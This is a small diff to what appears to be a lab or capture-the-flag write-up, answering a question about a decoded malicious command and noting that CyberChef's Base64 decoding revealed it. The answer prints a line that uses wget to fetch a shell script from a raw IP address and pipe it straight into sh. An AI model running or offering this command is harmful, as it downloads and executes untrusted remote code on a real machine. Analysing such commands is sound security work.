@@ -132,5 +132,5 @@ Q15: Once decoded, what is the command?
 
 A: wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
 
-I opened cyberchef 
+I opened cyberchef and tried a few common conversions. Base 64 worked.
 
